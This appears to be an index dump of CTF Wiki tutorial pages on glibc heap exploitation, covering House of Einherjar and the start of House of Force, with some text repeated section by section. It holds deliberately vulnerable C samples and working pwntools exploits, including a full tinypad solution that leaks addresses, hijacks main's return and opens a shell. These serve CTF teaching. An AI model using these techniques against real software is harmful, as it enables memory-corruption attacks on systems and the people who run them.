malloc will directly return the block of 2 times the word length, which is the smallest chunk. For example, a 64-bit system executing malloc(0) will return a block with a user area of 16 bytes. #include <stdio.h> int main(void) { char *chunk; chunk=malloc(0); puts(\"Get input:\"); gets(chunk); return 0; } // According to the number of bits in the system, malloc will allocate 8 or 16 bytes of user space 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 0x602030: 0x0000000000000000 0x0000000000000000 Note that the size of the user area is not equal to chunk_hear.size, chunk_hear.size=user area size + 2* word length Another point is that the memory size of the user application mentioned above will be modified, and it is possible to store the content using the prev_size field of the next chunk that is physically adjacent to it. Go back and look at the previous sample code. #include <stdio.h> int main(void) { char *chunk; chunk=malloc(24); puts(\"Get input:\"); gets(chunk); return 0; } Looking at the above code, the chunk size we applied for is 24 bytes. But when we compile it into a 64-bit executable, the actual allocated memory will be 16 bytes instead of 24. 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 How does the 16-byte space fit the next 24 bytes of content? The answer is to borrow the pre_size field of the next block. Let's take a look at the conversion between the size of the memory requested by the user and the amount of memory actually allocated in glibc. /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK) When req=24, request2size(24)=32. And remove the 16 bytes of the chunk header. In fact, the number of bytes available to the user is 16. According to what we learned earlier, we know that the chunk's pre_size only works when its previous block is released. So the user can actually use the prev_size field of the next chunk at this time, exactly 24 bytes. Actually, ptmalloc allocates memory in double words as the basic unit. Taking 64-bit system as an example, the allocated space is an integer multiple of 16, that is, the chunks applied by the user are 16-byte aligned.","title":"Determine the fill length"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/","text":"House Of Einherjar \u00b6 Introduction \u00b6 The house of einherjar is a heap utilization technique proposed by Hiroki Matsukuma . The heap exploit technique forces the malloc to return a chunk of almost any address. The main reason is to abuse the backward merge operation in free (combining chunks with low addresses), so as to avoid fragmentation as much as possible. In addition, it should be noted that in some special-sized heap blocks, off by one can not only modify the prev_size of the next heap block, but also modify the PREV_INUSE bit of the next heap block. Principle \u00b6 Backward merge operation \u00b6 The backward merge core operation in the free function is as follows /* consolidate backward */ if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( off , p , bck , fwd ); } Here borrow a picture from the original author For the overall operation, please refer to the chapter on \"Understanding the implementation of the heap\". Utilization principle \u00b6 Here we introduce the principle of the use. First of all, in the introduction of the previous heap, we can know the following knowledge Two physically adjacent chunks share the prev_size field, especially when the low-address chunk is in use, the chunk of the high-address chunk can be used by the chunk of the lower address. Therefore, we hope that the prev_size field of the high address chunk can be overwritten by writing the low address chunk. A chunk PREV_INUSE bit marks the usage state of its physically adjacent low address chunk, and this bit is physically adjacent to prev_size. When merging, the location of the new chunk depends on chunk_at_offset(p, -((long) prevsize)) . So if we can control a chunk prev_size and PREV_INUSE fields at the same time, then we can point the new chunk to almost any location. Utilization process \u00b6 Before overflow \u00b6 Assume that the state before overflow is as follows overflow \u00b6 Here we assume that the p0 heap block can write the prev_size field on the one hand, on the other hand, there is a vulnerability of off by one, you can write the PREV_INUSE part of a chunk, then After overflow \u00b6 Suppose we set the prev_size field of p1 to the difference between the destination chunk location we want and p1 . After the overflow, we release p1, then the position of the new chunk we get chunk_at_offset(p1, -((long) prevsize)) is the chunk location we want. Of course, it's important to note that since the new chunk is unlinked, you need to make sure that the fake chunk is constructed in the corresponding chunk location to bypass the unlink detection. Attack process example \u00b6 Code that can be used for House Of Einherjar attacks: #include <stdio.h> #include <stdlib.h> #include <unistd.h> int main ( void ){ char * s0 = malloc ( 0x200 ); \u3000 //\u6784\u9020fake chunk char * s1 = malloc ( 0x18 ); char * s2 = malloc ( 0xf0 ); \u3000 Char * s3 = malloc ( 0x20 ); //To prevent s2 from merging with top chunk printf ( \"begin \\n \" ); printf ( \"%p \\n \" , s0 ); printf ( \"input s0 \\n \" ); read ( 0 , s0 , 0x200 ); //\u8bfb\u5165fake chunk printf ( \"input s1 \\n \" ); read ( 0 , s1 , 0x19 ); //Off By One free ( s2 ); return 0 ; } The attack code is as follows: from pwn import * p = process ( \"./example\" ) context . log_level = 'debug' #gdb.attach(p) p . recvuntil ( \"begin \\n \" ) address = int ( p . recvline () . strip (), 16 ) p . recvuntil ( \"input s0 \\n \" ) payload = p64 ( 0 ) + p64 ( 0x101 ) + p64 ( address ) * 2 + \"A\" * 0xe0 ''' P64(address) * 2 is to bypass if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \\ malloc_printerr (\"corrupted double-linked list\"); ''' payload += p64 ( 0x100 ) #fake size p . sendline ( payload ) p . recvuntil ( \"input s1 \\n \" ) payload = \"A\" * 0x10 + p64 ( 0x220 ) + \" \\x00 \" p . sendline ( payload ) p . recvall () p . close () **Note that the method of bypassing unlink checking here is different from the method used in the previous unlink vulnerability. When using the unlink vulnerability: p -> fd = & p -3 * 4 p -> bk = & p -2 * 4 When used here, because there is no way to find &amp;p , so let directly: p -> fd = p p -> bk = p There is one point to note here: payload = p64 ( 0 ) + p64 ( 0x101 ) + p64 ( address ) * 2 + \"A\" * 0xe0 In fact, it is ok to modify it to the following: payload = p64 ( 0 ) + p64 ( 0x221 ) + p64 ( address ) * 2 + \"A\" * 0xe0 According to the truth, the size of the fake chunk is 0x221 , but why is 0x101 ? This is because the validation of size and prev_size only happens in unlink, which is verified in unlink: if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); So just spoof the prev_size field of the next chunk of the fake chunk. to sum up \u00b6 Here we summarize the places that need to pay attention to this utilization technology. An overflow vulnerability is required to write the prev_size and PREV_INUSE parts of a physically adjacent high address. We need to calculate the difference between the destination chunk and the p1 address, so we need to leak the address. We need to construct the corresponding fake chunk near the destination chunk to bypass the unlink detection. In fact, this technology is similar to the chunk extend/shrink technology. 2016 Seccon tinypad \u00b6 [Topic link] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad ) Basic function analysis \u00b6 First of all, it can be seen that a core read function since the program, that is, a string that reads a specified length of bytes, however, when the length of the read happens to be the specified length, a vulnerability of off by one will occur . Through the analysis program, we can easily see that the basic function of this program is to operate a tinypad, mainly the following operations At the beginning, the program judges each memo pointer at the beginning to judge whether it is empty. If it is not empty, it uses strlen to find its corresponding length, and outputs the content of memo. From here, we can also see that there are up to 4 memo. Add memo, traverse the variable tinypad that stores memo, determine if memo is being used according to the size of the tinypad's storage, and then, if possible, assign a memo. From here we can know that the program only starts from the tiny offset of 16*16=256. Each memo stores two fields, one is the size of the memo, and the other is the pointer corresponding to the memo. So we can create a new structure and modify the tinypad identified by ida to make it more readable (but there is no way for ida to help intelligently identify it). Also, since this add function relies on the read function, there is a vulnerability of off by one. In addition, we can see that the size of the chunk requested by the user is up to 256 bytes, which is exactly the same as the unused 256 bytes in front of the tinypad. Delete, according to the size of the storage memo to determine whether memo is being used, and set the corresponding memo size to 0, but does not set the pointer to NULL, which may result in Use After Free. At the beginning of the program, it is possible to output some related content, which is actually the basis for us to leak some base addresses . Edit. When editing, the program first copies it to the first 256 bytes of tinypad based on the contents of the previously stored memo, but as we said before, when memo stores 256 bytes, there will be off by one Vulnerabilities. At the same time, the program uses strlen to determine the length of the content of the tinypad after copying and output it. After that, the program continues to use strlen to find the length of memo, and reads the specified length of content into the tinypad. According to the read function, \\x00 must appear here. Finally, the program will read the contents of the first 256 bytes of the tinypad into the corresponding memo. drop out Use \u00b6 Basic use ideas are as follows Using the UAF vulnerability that did not set the pointer to NULL when deleting, the base address of the leaked heap Re-use the UAF vulnerability to leak the base address of libc. Use the house of einherjar method to forge chunks in the first 256 bytes of tinypad. When we apply again, we can control the pointers and contents of the four memo. Although our first thought here may be to directly override malloc_hook as the one_gadget address, however, since the program uses strlen to interpret how much length can be read when editing, malloc_hook is initially 0. So we cover it directly, so here we use other methods, that is, the return address of the main function of the modified program is one_gadget. The reason why it works is because the return address is often beginning with 7f, and the length is long enough to be overwritten as one_gadget. So we still need to leak the return address of the main function. Since libc stores the address of the main function environ pointer, we can first leak the address of environ and then know the address of the return address of the main function. The environ symbol is chosen here because the environ symbol is exported in libc, and argc and argv are not exported, which is relatively cumbersome. Finally, modify the return address of the main function to the one_gadget address to get the shell. Specific use of the script is as follows from pwn import * context . terminal = [ 'gnome-terminal' , '-x' , 'sh' , '-c' ] if args [ 'DEBUG' ]: context . log_level = 'debug' tinypad = ELF ( \"./tinypad\" ) if args [ 'REMOTE' ]: p = remote ( '127.0.0.1' , 7777 ) libc = ELF ( './libc.so.6' ) else : p = process ( \"./tinypad\" ) libc = ELF ( './libc.so.6' ) main_arena_offset = 0x3c4b20 log . info ( 'PID: ' + str ( proc . pidof ( p )[ 0 ])) def add ( size , content ): p . recvuntil ( '(CMD)>>> ' ) p . sendline ( 'a' ) p . recvuntil ( '(SIZE)>>> ' ) p . sendline ( str ( size )) p . recvuntil ( '(CONTENT)>>> ' ) p . sendline ( content ) def edit ( idx , content ): p . recvuntil ( '(CMD)>>> ' ) p . sendline ( 'e' ) p . recvuntil ( '(INDEX)>>> ' ) p . sendline ( str ( idx )) p . recvuntil ( '(CONTENT)>>> ' ) p . sendline ( content ) p . recvuntil ( 'Is it OK? \\n ' ) p . sendline ( 'Y' ) def delete ( idx ): p . recvuntil ( '(CMD)>>> ' ) p . sendline ( 'd' ) p . recvuntil ( '(INDEX)>>> ' ) p . sendline ( str ( idx )) def run (): p . recvuntil ( ' ============================================================================ \\n\\n ' ) # 1. leak heap base add ( 0x70 , 'a' * 8 ) # idx 0 add ( 0x70 , 'b' * 8 ) # idx 1 add ( 0x100 , 'c' * 8 ) # idx 2 delete ( 2 ) # delete idx 1 delete ( 1 ) # delete idx 0, idx 0 point to idx 1 p . recvuntil ( ' # CONTENT: ' ) data = p . recvuntil ( ' \\n ' , drop = True ) # get pointer point to idx1 heap_base = u64 ( data . ljust ( 8 , ' \\x00 ' )) - 0x80 log . success ( 'get heap base: ' + hex ( heap_base )) # 2. leak libc base # this will trigger malloc_consolidate # first idx0 will go to unsorted bin # second idx1 will merge with idx0(unlink), and point to idx0 # third idx1 will merge into top chunk # but cause unlink feture, the idx0's fd and bk won't change # so idx0 will leak the unsorted bin addr delete ( 3 ) p . recvuntil ( ' # CONTENT: ' ) data = p . recvuntil ( ' \\n ' , drop = True ) unsorted_offset_arena = 8 + 10 * 8 main_arena = u64 ( data . ljust ( 8 , ' \\x00 ' )) - unsorted_offset_arena libc_base = main_arena - main_arena_offset log . success ( 'main arena addr: ' + hex ( main_arena )) log . success ( 'libc base addr: ' + hex ( libc_base )) # 3. house of einherjar add ( 0x18 , 'a' * 0x18 ) # idx 0 # we would like trigger house of einherjar at idx 1 add ( 0x100 , 'b' * 0xf8 + ' \\x11 ' ) # idx 1 add ( 0x100 , 'c' * 0xf8 ) # idx 2 add ( 0x100 , 'd' * 0xf8 ) #idx 3 # create a fake chunk in tinypad's 0x100 buffer, offset 0x20 tinypad_addr = 0x602040 fakechunk_addr = tinypad_addr + 0x20 fakechunk_size = 0x101 fakechunk = p64 ( 0 ) + p64 ( fakechunk_size ) + p64 ( fakechunk_addr ) + p64 ( fakechunk_addr ) edit ( 3 , 'd' * 0x20 + fakechunk ) # overwrite idx 1's prev_size and # set minaddr of size to '\\x00' # idx 0's chunk size is 0x20 diff = heap_base + 0x20 - fakechunk_addr log . info ( 'diff between idx1 and fakechunk: ' + hex ( diff )) # '\\0' padding caused by strcpy diff_strip = p64 ( diff ) . strip ( ' \\0 ' ) number_of_zeros = len ( p64 ( diff )) - len ( diff_strip ) for i in range ( number_of_zeros + 1 ): data = diff_strip . rjust ( 0x18 - i , 'f' ) edit ( 1 , data ) delete ( 2 ) p . recvuntil ( ' \\n Deleted.' ) # fix the fake chunk size, fd and bk # fd and bk must be unsorted bin edit ( 4 , 'd' * 0x20 + p64 ( 0 ) + p64 ( 0x101 ) + p64 ( main_arena + 88 ) + p64 ( main_arena + 88 )) # 3. overwrite malloc_hook with one_gadget one_gadget_addr = libc_base + 0x45216 environ_pointer = libc_base + libc . symbols [ '__environ' ] log . info ( 'one gadget addr: ' + hex ( one_gadget_addr )) log . info ( 'environ pointer addr: ' + hex ( environ_pointer )) #fake_malloc_chunk = main_arena - 60 + 9 # set memo[0].size = 'a'*8, # set memo[0].content point to environ to leak environ addr fake_pad = 'f' * ( 0x100 - 0x20 - 0x10 ) + 'a' * 8 + p64 ( environ_pointer ) + 'a' * 8 + p64 ( 0x602148 ) # get a fake chunk add ( 0x100 - 8 , fake_pad ) # idx 2 #gdb.attach(p) # get environ addr p . recvuntil ( ' # CONTENT: ' ) environ_addr = p . recvuntil ( ' \\n ' , drop = True ) . ljust ( 8 , ' \\x00 ' ) environ_addr = u64 ( environ_addr ) main_ret_addr = environ_addr - 30 * 8 # set memo[0].content point to main_ret_addr edit ( 2 , p64 ( main_ret_addr )) # overwrite main_ret_addr with one_gadget addr edit ( 1 , p64 ( one_gadget_addr )) p . interactive () if __name__ == \"__main__\" : run () references \u00b6 https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606 https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf https://bbs.pediy.com/thread-226119.htm","title":"House of Einherjar"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#house-of-einherjar","text":"","title":"House Of Einherjar"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#introduction","text":"The house of einherjar is a heap utilization technique proposed by Hiroki Matsukuma . The heap exploit technique forces the malloc to return a chunk of almost any address. The main reason is to abuse the backward merge operation in free (combining chunks with low addresses), so as to avoid fragmentation as much as possible. In addition, it should be noted that in some special-sized heap blocks, off by one can not only modify the prev_size of the next heap block, but also modify the PREV_INUSE bit of the next heap block.","title":"Introduction"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#principle","text":"","title":"Principle"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#backward-merge-operation","text":"The backward merge core operation in the free function is as follows /* consolidate backward */ if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( off , p , bck , fwd ); } Here borrow a picture from the original author For the overall operation, please refer to the chapter on \"Understanding the implementation of the heap\".","title":"Backward merge operation"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#utilization-principle","text":"Here we introduce the principle of the use. First of all, in the introduction of the previous heap, we can know the following knowledge Two physically adjacent chunks share the prev_size field, especially when the low-address chunk is in use, the chunk of the high-address chunk can be used by the chunk of the lower address. Therefore, we hope that the prev_size field of the high address chunk can be overwritten by writing the low address chunk. A chunk PREV_INUSE bit marks the usage state of its physically adjacent low address chunk, and this bit is physically adjacent to prev_size. When merging, the location of the new chunk depends on chunk_at_offset(p, -((long) prevsize)) . So if we can control a chunk prev_size and PREV_INUSE fields at the same time, then we can point the new chunk to almost any location.","title":"Utilization principle"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#utilization-process","text":"","title":"Utilization process"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#before-overflow","text":"Assume that the state before overflow is as follows","title":"Before overflow"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#overflow","text":"Here we assume that the p0 heap block can write the prev_size field on the one hand, on the other hand, there is a vulnerability of off by one, you can write the PREV_INUSE part of a chunk, then","title":"overflow"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#after-overflow","text":"Suppose we set the prev_size field of p1 to the difference between the destination chunk location we want and p1 . After the overflow, we release p1, then the position of the new chunk we get chunk_at_offset(p1, -((long) prevsize)) is the chunk location we want. Of course, it's important to note that since the new chunk is unlinked, you need to make sure that the fake chunk is constructed in the corresponding chunk location to bypass the unlink detection.","title":"After overflow"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#attack-process-example","text":"Code that can be used for House Of Einherjar attacks: #include <stdio.h> #include <stdlib.h> #include <unistd.h> int main ( void ){ char * s0 = malloc ( 0x200 ); \u3000 //\u6784\u9020fake chunk char * s1 = malloc ( 0x18 ); char * s2 = malloc ( 0xf0 ); \u3000 Char * s3 = malloc ( 0x20 ); //To prevent s2 from merging with top chunk printf ( \"begin \\n \" ); printf ( \"%p \\n \" , s0 ); printf ( \"input s0 \\n \" ); read ( 0 , s0 , 0x200 ); //\u8bfb\u5165fake chunk printf ( \"input s1 \\n \" ); read ( 0 , s1 , 0x19 ); //Off By One free ( s2 ); return 0 ; } The attack code is as follows: from pwn import * p = process ( \"./example\" ) context . log_level = 'debug' #gdb.attach(p) p . recvuntil ( \"begin \\n \" ) address = int ( p . recvline () . strip (), 16 ) p . recvuntil ( \"input s0 \\n \" ) payload = p64 ( 0 ) + p64 ( 0x101 ) + p64 ( address ) * 2 + \"A\" * 0xe0 ''' P64(address) * 2 is to bypass if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \\ malloc_printerr (\"corrupted double-linked list\"); ''' payload += p64 ( 0x100 ) #fake size p . sendline ( payload ) p . recvuntil ( \"input s1 \\n \" ) payload = \"A\" * 0x10 + p64 ( 0x220 ) + \" \\x00 \" p . sendline ( payload ) p . recvall () p . close () **Note that the method of bypassing unlink checking here is different from the method used in the previous unlink vulnerability. When using the unlink vulnerability: p -> fd = & p -3 * 4 p -> bk = & p -2 * 4 When used here, because there is no way to find &amp;p , so let directly: p -> fd = p p -> bk = p There is one point to note here: payload = p64 ( 0 ) + p64 ( 0x101 ) + p64 ( address ) * 2 + \"A\" * 0xe0 In fact, it is ok to modify it to the following: payload = p64 ( 0 ) + p64 ( 0x221 ) + p64 ( address ) * 2 + \"A\" * 0xe0 According to the truth, the size of the fake chunk is 0x221 , but why is 0x101 ? This is because the validation of size and prev_size only happens in unlink, which is verified in unlink: if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); So just spoof the prev_size field of the next chunk of the fake chunk.","title":"Attack process example"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#to-sum-up","text":"Here we summarize the places that need to pay attention to this utilization technology. An overflow vulnerability is required to write the prev_size and PREV_INUSE parts of a physically adjacent high address. We need to calculate the difference between the destination chunk and the p1 address, so we need to leak the address. We need to construct the corresponding fake chunk near the destination chunk to bypass the unlink detection. In fact, this technology is similar to the chunk extend/shrink technology.","title":"to sum up"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#2016-seccon-tinypad","text":"[Topic link] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad )","title":"2016 Seccon tinypad"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#basic-function-analysis","text":"First of all, it can be seen that a core read function since the program, that is, a string that reads a specified length of bytes, however, when the length of the read happens to be the specified length, a vulnerability of off by one will occur . Through the analysis program, we can easily see that the basic function of this program is to operate a tinypad, mainly the following operations At the beginning, the program judges each memo pointer at the beginning to judge whether it is empty. If it is not empty, it uses strlen to find its corresponding length, and outputs the content of memo. From here, we can also see that there are up to 4 memo. Add memo, traverse the variable tinypad that stores memo, determine if memo is being used according to the size of the tinypad's storage, and then, if possible, assign a memo. From here we can know that the program only starts from the tiny offset of 16*16=256. Each memo stores two fields, one is the size of the memo, and the other is the pointer corresponding to the memo. So we can create a new structure and modify the tinypad identified by ida to make it more readable (but there is no way for ida to help intelligently identify it). Also, since this add function relies on the read function, there is a vulnerability of off by one. In addition, we can see that the size of the chunk requested by the user is up to 256 bytes, which is exactly the same as the unused 256 bytes in front of the tinypad. Delete, according to the size of the storage memo to determine whether memo is being used, and set the corresponding memo size to 0, but does not set the pointer to NULL, which may result in Use After Free. At the beginning of the program, it is possible to output some related content, which is actually the basis for us to leak some base addresses . Edit. When editing, the program first copies it to the first 256 bytes of tinypad based on the contents of the previously stored memo, but as we said before, when memo stores 256 bytes, there will be off by one Vulnerabilities. At the same time, the program uses strlen to determine the length of the content of the tinypad after copying and output it. After that, the program continues to use strlen to find the length of memo, and reads the specified length of content into the tinypad. According to the read function, \\x00 must appear here. Finally, the program will read the contents of the first 256 bytes of the tinypad into the corresponding memo. drop out","title":"Basic function analysis"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#use","text":"Basic use ideas are as follows Using the UAF vulnerability that did not set the pointer to NULL when deleting, the base address of the leaked heap Re-use the UAF vulnerability to leak the base address of libc. Use the house of einherjar method to forge chunks in the first 256 bytes of tinypad. When we apply again, we can control the pointers and contents of the four memo. Although our first thought here may be to directly override malloc_hook as the one_gadget address, however, since the program uses strlen to interpret how much length can be read when editing, malloc_hook is initially 0. So we cover it directly, so here we use other methods, that is, the return address of the main function of the modified program is one_gadget. The reason why it works is because the return address is often beginning with 7f, and the length is long enough to be overwritten as one_gadget. So we still need to leak the return address of the main function. Since libc stores the address of the main function environ pointer, we can first leak the address of environ and then know the address of the return address of the main function. The environ symbol is chosen here because the environ symbol is exported in libc, and argc and argv are not exported, which is relatively cumbersome. Finally, modify the return address of the main function to the one_gadget address to get the shell. Specific use of the script is as follows from pwn import * context . terminal = [ 'gnome-terminal' , '-x' , 'sh' , '-c' ] if args [ 'DEBUG' ]: context . log_level = 'debug' tinypad = ELF ( \"./tinypad\" ) if args [ 'REMOTE' ]: p = remote ( '127.0.0.1' , 7777 ) libc = ELF ( './libc.so.6' ) else : p = process ( \"./tinypad\" ) libc = ELF ( './libc.so.6' ) main_arena_offset = 0x3c4b20 log . info ( 'PID: ' + str ( proc . pidof ( p )[ 0 ])) def add ( size , content ): p . recvuntil ( '(CMD)>>> ' ) p . sendline ( 'a' ) p . recvuntil ( '(SIZE)>>> ' ) p . sendline ( str ( size )) p . recvuntil ( '(CONTENT)>>> ' ) p . sendline ( content ) def edit ( idx , content ): p . recvuntil ( '(CMD)>>> ' ) p . sendline ( 'e' ) p . recvuntil ( '(INDEX)>>> ' ) p . sendline ( str ( idx )) p . recvuntil ( '(CONTENT)>>> ' ) p . sendline ( content ) p . recvuntil ( 'Is it OK? \\n ' ) p . sendline ( 'Y' ) def delete ( idx ): p . recvuntil ( '(CMD)>>> ' ) p . sendline ( 'd' ) p . recvuntil ( '(INDEX)>>> ' ) p . sendline ( str ( idx )) def run (): p . recvuntil ( ' ============================================================================ \\n\\n ' ) # 1. leak heap base add ( 0x70 , 'a' * 8 ) # idx 0 add ( 0x70 , 'b' * 8 ) # idx 1 add ( 0x100 , 'c' * 8 ) # idx 2 delete ( 2 ) # delete idx 1 delete ( 1 ) # delete idx 0, idx 0 point to idx 1 p . recvuntil ( ' # CONTENT: ' ) data = p . recvuntil ( ' \\n ' , drop = True ) # get pointer point to idx1 heap_base = u64 ( data . ljust ( 8 , ' \\x00 ' )) - 0x80 log . success ( 'get heap base: ' + hex ( heap_base )) # 2. leak libc base # this will trigger malloc_consolidate # first idx0 will go to unsorted bin # second idx1 will merge with idx0(unlink), and point to idx0 # third idx1 will merge into top chunk # but cause unlink feture, the idx0's fd and bk won't change # so idx0 will leak the unsorted bin addr delete ( 3 ) p . recvuntil ( ' # CONTENT: ' ) data = p . recvuntil ( ' \\n ' , drop = True ) unsorted_offset_arena = 8 + 10 * 8 main_arena = u64 ( data . ljust ( 8 , ' \\x00 ' )) - unsorted_offset_arena libc_base = main_arena - main_arena_offset log . success ( 'main arena addr: ' + hex ( main_arena )) log . success ( 'libc base addr: ' + hex ( libc_base )) # 3. house of einherjar add ( 0x18 , 'a' * 0x18 ) # idx 0 # we would like trigger house of einherjar at idx 1 add ( 0x100 , 'b' * 0xf8 + ' \\x11 ' ) # idx 1 add ( 0x100 , 'c' * 0xf8 ) # idx 2 add ( 0x100 , 'd' * 0xf8 ) #idx 3 # create a fake chunk in tinypad's 0x100 buffer, offset 0x20 tinypad_addr = 0x602040 fakechunk_addr = tinypad_addr + 0x20 fakechunk_size = 0x101 fakechunk = p64 ( 0 ) + p64 ( fakechunk_size ) + p64 ( fakechunk_addr ) + p64 ( fakechunk_addr ) edit ( 3 , 'd' * 0x20 + fakechunk ) # overwrite idx 1's prev_size and # set minaddr of size to '\\x00' # idx 0's chunk size is 0x20 diff = heap_base + 0x20 - fakechunk_addr log . info ( 'diff between idx1 and fakechunk: ' + hex ( diff )) # '\\0' padding caused by strcpy diff_strip = p64 ( diff ) . strip ( ' \\0 ' ) number_of_zeros = len ( p64 ( diff )) - len ( diff_strip ) for i in range ( number_of_zeros + 1 ): data = diff_strip . rjust ( 0x18 - i , 'f' ) edit ( 1 , data ) delete ( 2 ) p . recvuntil ( ' \\n Deleted.' ) # fix the fake chunk size, fd and bk # fd and bk must be unsorted bin edit ( 4 , 'd' * 0x20 + p64 ( 0 ) + p64 ( 0x101 ) + p64 ( main_arena + 88 ) + p64 ( main_arena + 88 )) # 3. overwrite malloc_hook with one_gadget one_gadget_addr = libc_base + 0x45216 environ_pointer = libc_base + libc . symbols [ '__environ' ] log . info ( 'one gadget addr: ' + hex ( one_gadget_addr )) log . info ( 'environ pointer addr: ' + hex ( environ_pointer )) #fake_malloc_chunk = main_arena - 60 + 9 # set memo[0].size = 'a'*8, # set memo[0].content point to environ to leak environ addr fake_pad = 'f' * ( 0x100 - 0x20 - 0x10 ) + 'a' * 8 + p64 ( environ_pointer ) + 'a' * 8 + p64 ( 0x602148 ) # get a fake chunk add ( 0x100 - 8 , fake_pad ) # idx 2 #gdb.attach(p) # get environ addr p . recvuntil ( ' # CONTENT: ' ) environ_addr = p . recvuntil ( ' \\n ' , drop = True ) . ljust ( 8 , ' \\x00 ' ) environ_addr = u64 ( environ_addr ) main_ret_addr = environ_addr - 30 * 8 # set memo[0].content point to main_ret_addr edit ( 2 , p64 ( main_ret_addr )) # overwrite main_ret_addr with one_gadget addr edit ( 1 , p64 ( one_gadget_addr )) p . interactive () if __name__ == \"__main__\" : run ()","title":"Use"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#references","text":"https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606 https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf https://bbs.pediy.com/thread-226119.htm","title":"references"},{"location":"pwn/linux/glibc-heap/house_of_force/","text":"House Of Force \u00b6 Introduction \u00b6 House Of Force belongs to the House Of XXX series, and House Of XXX is a series of methods for the glibc stacker proposed in the 2004 \"The Malloc Maleficarum-Glibc Malloc Exploitation Techniques\". However, most of the methods proposed in The Malloc Maleficarum have not worked today, and the House Of XXX we are referring to now is quite different from the one written in the 2004 article. But \"The Malloc Maleficarum\" is still a recommended article, you can read the original text here: https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt Principle \u00b6 House Of Force is a heap utilization method, but it does not mean that House Of Force must be exploited based on heap vulnerabilities. If a heap based vulnerability is to be exploited by the House Of Force method, the following conditions are required: Ability to control the size field of the top chunk by overflow, etc. Be able to freely control the size of the heap allocation size The reason that House Of Force is generated is that glibc handles the top chunk. According to the knowledge of the previous heap data structure, we know that when all the free blocks are unable to meet the requirements, the heap will be split from the top chunk. The corresponding size is used as the space for the heap block. So what happens when the top chunk is used to allocate the size of the heap block to any value controlled by the user? The answer is that you can make the top chunk point to whatever we want, which is equivalent to an arbitrary address write. However, in glibc, the size of the user request and the existing size of the top chunk are verified. // Get the current top chunk and calculate its corresponding size victim = off-&gt; top; size = chunksize(victim); // If after splitting, its size still satisfies the minimum size of chunk, then you can split directly. if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); off-&gt; top = remainder; set_head(victim, nb | PREV_INUSE | (av! = &amp; main_arena? NON_MAIN_ARENA: 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk (off, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; } However, if you can tamper with size to a large value, you can easily pass this verification, which is what we said earlier that you need a vulnerability that can control the top chunk size field. (unsigned long) (size) >= (unsigned long) (nb + MINSIZE) The general practice is to change the size of the top chunk to -1, because the size is converted to an unsigned number when comparing, so -1 is the largest number of unsigned longs, so you can pass the verification anyway. remainder = chunk_at_offset(victim, nb); off-&gt; top = remainder; /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) After that, the top pointer will be updated, and the next heap block will be allocated to this location. The user only needs to control the pointer to write arbitrary values (write-anything-anywhere). At the same time, we need to pay attention to the topchunk size will also be updated, the update method is as follows victim = off -& gt ; top ; size = chunksize ( victim ); remainder_size = size - nb ; set_head ( remainder , remainder_size | PREV_INUSE ); So, if we want to allocate chunks of size x at the specified location next time, we need to make sure that the remainder_size is not less than x+ MINSIZE. Simple example 1 \u00b6 After learning the principles of HOF, we use an example to illustrate the use of HOF. The goal of this example is to tamper with malloc@got.plt by HOF to implement the hijacking process. int main() { long * ptr, * ptr2; ptr = malloc (0x10); ptr = (long *) (((long) ptr) +24); *ptr=-1; // &lt;=== Change the size field of the top chunk to 0xffffffffffffffff Malloc(-4120); // &lt;=== reduce the top chunk pointer Malloc(0x10); // &lt;=== allocate blocks to implement arbitrary address writes } First, we allocate a block of size 0x10 bytes. 0x602000: 0x0000000000000000 0x0000000000000021 &lt;=== ptr 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <=== top chunk 0x602030: 0x0000000000000000 